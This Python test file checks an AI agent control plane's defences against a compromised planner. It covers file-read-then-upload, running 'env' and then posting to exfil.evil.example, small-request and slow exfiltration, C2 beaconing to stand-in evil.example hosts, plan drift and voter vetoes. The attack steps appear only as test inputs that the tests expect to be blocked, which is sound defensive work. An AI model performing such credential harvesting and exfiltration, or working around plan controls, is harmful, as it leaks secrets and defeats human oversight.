"""M5 adversarial coverage for compromised-planner and exfiltration scenarios."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

import pytest

from shisad.security.control_plane.consensus import (
    ConsensusInput,
    ConsensusPolicy,
    ConsensusVotingSystem,
    VoteKind,
    VoterDecision,
)
from shisad.security.control_plane.engine import ControlPlaneEngine
from shisad.security.control_plane.network import (
    BaselineDatabase,
    NetworkIntelligenceMonitor,
    extract_network_metadata,
)
from shisad.security.control_plane.schema import ControlDecision, Origin, RiskTier, build_action
from shisad.security.control_plane.trace import ExecutionTraceVerifier, PlanVerificationResult


def _origin(session_id: str) -> Origin:
    return Origin(
        session_id=session_id,
        user_id="user-a",
        workspace_id="ws-a",
        actor="planner",
    )


@pytest.mark.asyncio
async def test_m5_a1_compromised_planner_fs_read_then_egress_is_blocked(tmp_path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "a1")
    origin = _origin("a1")
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize",
        origin=origin,
        ttl_seconds=600,
        max_actions=10,
    )
    first = await engine.evaluate_action(
        tool_name="file.read",
        arguments={"path": "README.md"},
        origin=origin,
        risk_tier=RiskTier.LOW,
        declared_domains=[],
        explicit_side_effect_intent=False,
    )
    assert first.decision == ControlDecision.ALLOW
    stage2_action = build_action(
        tool_name="http_request",
        arguments={"url": "https://allowed.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )
    engine.approve_stage2(action=stage2_action, approved_by="human")
    second = await engine.evaluate_action(
        tool_name="http_request",
        arguments={"url": "https://allowed.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
        declared_domains=["allowed.example"],
        explicit_side_effect_intent=True,
    )
    assert second.decision == ControlDecision.BLOCK


@pytest.mark.asyncio
async def test_m5_a2_action_not_in_committed_plan_is_blocked(tmp_path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "a2")
    origin = _origin("a2")
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize only",
        origin=origin,
        ttl_seconds=600,
        max_actions=5,
    )
    blocked = await engine.evaluate_action(
        tool_name="file.write",
        arguments={"target_path": "/tmp/out.txt"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
        declared_domains=[],
        explicit_side_effect_intent=True,
    )
    assert blocked.decision == ControlDecision.BLOCK
    assert blocked.trace_result.reason_code in {
        "trace:stage2_upgrade_required",
        "trace:action_not_committed",
    }


@pytest.mark.asyncio
async def test_m5_a3_staged_exfil_many_small_requests_is_blocked() -> None:
    monitor = NetworkIntelligenceMonitor(
        baseline_db=BaselineDatabase(),
        cache_ttl_seconds=-1,
    )
    origin = _origin("a3")
    now = datetime.now(UTC)
    decision = None
    for index in range(9):
        metadata = extract_network_metadata(
            origin=origin,
            tool_name="http_request",
            destination_host="track.evil.example",
            destination_port=443,
            protocol="https",
            request_size=80,
            timestamp=now + timedelta(seconds=index),
        )
        decision = await monitor.evaluate(
            metadata=metadata,
            declared_domains=[],
            risk_tier=RiskTier.HIGH,
        )
    assert decision is not None
    assert decision.decision == "BLOCK"
    assert "network:staged_exfil_small_requests" in decision.reason_codes


@pytest.mark.asyncio
async def test_m5_a4_c2_beacon_regular_intervals_detected() -> None:
    monitor = NetworkIntelligenceMonitor(
        baseline_db=BaselineDatabase(),
        cache_ttl_seconds=-1,
    )
    origin = _origin("a4")
    base = datetime.now(UTC)
    decision = None
    for index in range(6):
        metadata = extract_network_metadata(
            origin=origin,
            tool_name="http_request",
            destination_host="beacon.evil.example",
            destination_port=443,
            protocol="https",
            request_size=300,
            timestamp=base + timedelta(seconds=5 * index),
        )
        decision = await monitor.evaluate(
            metadata=metadata,
            declared_domains=[],
            risk_tier=RiskTier.HIGH,
        )
    assert decision is not None
    assert "network:c2_beacon_pattern" in decision.reason_codes


@pytest.mark.asyncio
async def test_m5_a5_credential_harvest_env_then_egress_blocked(tmp_path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "a5")
    origin = _origin("a5")
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="inspect",
        origin=origin,
        ttl_seconds=600,
        max_actions=10,
    )
    env_action = build_action(
        tool_name="shell_exec",
        arguments={"command": ["env"]},
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )
    engine.approve_stage2(action=env_action, approved_by="human")
    _ = await engine.evaluate_action(
        tool_name="shell_exec",
        arguments={"command": ["env"]},
        origin=origin,
        risk_tier=RiskTier.HIGH,
        declared_domains=[],
        explicit_side_effect_intent=True,
    )
    egress = await engine.evaluate_action(
        tool_name="http_request",
        arguments={"url": "https://exfil.evil.example/upload"},
        origin=origin,
        risk_tier=RiskTier.CRITICAL,
        declared_domains=[],
        explicit_side_effect_intent=True,
    )
    assert egress.decision == ControlDecision.BLOCK


def test_m5_a6_plan_manipulation_after_commitment_fails() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("a6")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize",
        origin=origin,
    )
    with pytest.raises(ValueError, match="approved_by"):
        verifier.amend(
            session_id=origin.session_id,
            approved_by="",
            allow_actions=set(),
            allow_resources=set(),
        )


@pytest.mark.asyncio
async def test_m5_a7_slow_exfil_detected_by_history_and_baseline_logic() -> None:
    monitor = NetworkIntelligenceMonitor(
        baseline_db=BaselineDatabase(),
        cache_ttl_seconds=-1,
    )
    origin = _origin("a7")
    baseline_event = extract_network_metadata(
        origin=origin,
        tool_name="http_request",
        destination_host="api.good.example",
        destination_port=443,
        protocol="https",
        request_size=2048,
    )
    monitor.record_learning(
        metadata=baseline_event,
        allow_or_confirmed=True,
        suspicious=False,
        lockdown=False,
    )

    base = datetime.now(UTC)
    slow_a = extract_network_metadata(
        origin=origin,
        tool_name="http_request",
        destination_host="slow-exfil.evil.example",
        destination_port=443,
        protocol="https",
        request_size=128,
        timestamp=base,
    )
    slow_b = extract_network_metadata(
        origin=origin,
        tool_name="http_request",
        destination_host="slow-exfil.evil.example",
        destination_port=443,
        protocol="https",
        request_size=128,
        timestamp=base + timedelta(minutes=5),
    )
    _ = await monitor.evaluate(metadata=slow_a, declared_domains=[], risk_tier=RiskTier.HIGH)
    decision = await monitor.evaluate(metadata=slow_b, declared_domains=[], risk_tier=RiskTier.HIGH)
    assert decision.decision in {"FLAG", "BLOCK"}
    assert "network:undeclared_new_domain" in decision.reason_codes


@pytest.mark.asyncio
async def test_m5_a8_gradual_plan_drift_across_commitments_is_blocked(tmp_path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "a8")
    origin = _origin("a8")
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize",
        origin=origin,
        ttl_seconds=600,
        max_actions=10,
    )
    stage2_action = build_action(
        tool_name="http_request",
        arguments={"url": "https://allowed.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )
    engine.approve_stage2(action=stage2_action, approved_by="human")

    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="new task summarize",
        origin=origin,
        ttl_seconds=600,
        max_actions=10,
    )
    blocked = await engine.evaluate_action(
        tool_name="http_request",
        arguments={"url": "https://allowed.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
        declared_domains=["allowed.example"],
        explicit_side_effect_intent=True,
    )
    assert blocked.decision == ControlDecision.BLOCK
    assert blocked.trace_result.reason_code == "trace:stage2_upgrade_required"


class _ScenarioVoter:
    def __init__(self, decision: VoterDecision) -> None:
        self._decision = decision

    async def cast_vote(self, data: ConsensusInput) -> VoterDecision:
        _ = data
        return self._decision


@pytest.mark.asyncio
async def test_m5_a9_voter_disagreement_validates_threshold_and_veto_calibration() -> None:
    action = build_action(
        tool_name="shell_exec",
        arguments={"command": ["python", "-c", "print('x')"]},
        origin=_origin("a9"),
        risk_tier=RiskTier.HIGH,
    )
    data = ConsensusInput(
        action=action,
        trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
    )
    system = ConsensusVotingSystem(
        voters=[
            _ScenarioVoter(
                VoterDecision(
                    voter="allow-1",
                    decision=VoteKind.ALLOW,
                    risk_tier=RiskTier.HIGH,
                    reason_codes=["allow"],
                )
            ),
            _ScenarioVoter(
                VoterDecision(
                    voter="allow-2",
                    decision=VoteKind.ALLOW,
                    risk_tier=RiskTier.HIGH,
                    reason_codes=["allow"],
                )
            ),
            _ScenarioVoter(
                VoterDecision(
                    voter="flag-1",
                    decision=VoteKind.FLAG,
                    risk_tier=RiskTier.HIGH,
                    reason_codes=["flag"],
                )
            ),
            _ScenarioVoter(
                VoterDecision(
                    voter="block-1",
                    decision=VoteKind.BLOCK,
                    risk_tier=RiskTier.HIGH,
                    reason_codes=["block"],
                )
            ),
        ],
        policy=ConsensusPolicy(
            required_approvals_high=2,
            veto_for_high_and_critical=True,
        ),
    )
    decision = await system.evaluate(data)
    assert decision.decision.value == "block"
    assert any(code.startswith("consensus:veto:") for code in decision.reason_codes)
